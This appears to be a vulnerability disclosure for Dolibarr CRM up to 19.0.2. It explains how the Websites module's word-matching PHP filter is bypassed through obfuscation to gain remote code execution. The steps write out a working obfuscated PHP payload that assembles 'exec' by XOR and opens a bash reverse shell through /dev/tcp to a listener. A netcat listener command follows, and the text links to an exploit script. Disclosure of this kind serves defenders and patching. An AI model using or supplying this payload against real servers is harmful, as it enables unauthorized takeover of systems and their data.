# DynamicPHPCode Filtering Bypass leads to Remote Code Execution
## Description
The "Websites" module in Dolibarr CRM version <= 19.0.2 has "checkPHPCode" function check to ensure that the page does not contain any malicious function. However, this function only checks by using match word searching, which allows malicious authenticated users to bypass by using obfuscation techniques.

## Detail
1. Open module Website in Dolibarr Setup
2. Navigate to the Website page of Dolibarr application.
3. Create new website, import website template and choose any template
4. Choose one page of template and edit HTML source.
5. Submit HTML source with payload:

      <code>&lt;?php
          $_ = "{";
          $_ = ($_^"&lt;").($_^"&gt;;").($_^"/");
          ${'_'.$_} = array("_" =&gt; "exec", "__" =&gt; "/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/{YOUR_LISTENER_IP}/{YOUR_LISTENER_PORT} 0&gt;&amp;1'");
          $func_name = ${'_'.$_}["_"];
          $param = ${'_'.$_}["__"];
          $output = call_user_func($func_name, $param);
          echo $output;
      ?&gt;</code>

  
7. Using command ***nc -lvnp  {YOUR_LISTENER_PORT}*** in listener machine
8. Payload lead to Remote Code Execution in the target server

Or you can using <a href="https://drive.google.com/file/d/1gsUqtWGMqpVrPMXiHdmdFLRC8MzcFtfw/view?usp=drive_link">exploit.py</a>

## POC
Kindly go through the below video for detailed steps:
<a href="https://drive.google.com/file/d/11THfPSHO1BnIGTrd1SZRg6VoaR3MlwIx/view?usp=drive_link">POC.mp4</a>
<a href="https://drive.google.com/file/d/1cxPRDip2xlgAPlgKgWjomDHiY_g-2UW4/view?usp=drive_link">POC_by_script.mp4</a>
